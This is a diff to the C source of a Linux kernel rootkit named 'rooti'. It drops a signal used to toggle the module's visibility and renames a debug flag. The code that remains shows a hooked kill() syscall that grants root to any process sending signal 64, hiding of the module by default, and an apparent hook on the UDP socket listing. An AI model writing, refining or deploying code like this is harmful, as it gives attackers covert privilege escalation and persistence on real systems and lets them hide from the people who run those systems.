@@ -26,7 +26,6 @@ MODULE_VERSION("1.0.0");
 
 // Unused signal numbers which can be used by the rootkit for its own purposes
 enum rooti_signals {
-    ROOTI_SIG_HIDE = 63,  // toogle hiding of this kernel module
     ROOTI_SIG_REG = 64    // request by a usermode process to be serviced by the rootkit
 };
 
@@ -64,16 +63,7 @@ static int (*orig_udp4_seq_show)(struct seq_file *seq, void *v);
 static asmlinkage long hook_kill(const struct pt_regs *regs)
 {
     int sig = regs->si;
-    if (sig == ROOTI_SIG_HIDE) {
-        // Toggle hidden state
-        if (rooti_hidden) {
-            rooti_showme();
-        } else {
-            rooti_hideme();
-        }
-        return 0;
-    }
-    else if (sig == ROOTI_SIG_REG) {
+    if (sig == ROOTI_SIG_REG) {
         // Register the new process
         rooti_clients_bitmap[current->pid / 8] |= (1U << current->pid % 8);
         return rooti_elevate_privilege();
@@ -331,7 +321,7 @@ static int __init rooti_init(void)
     }
 
     // If configured to be hidden by default, hide this rootkit
-#ifndef ROOTI_SHOWME_DEFAULT
+#ifndef ROOTI_DEBUG_SHOWME
     rooti_hideme();
 #endif
 
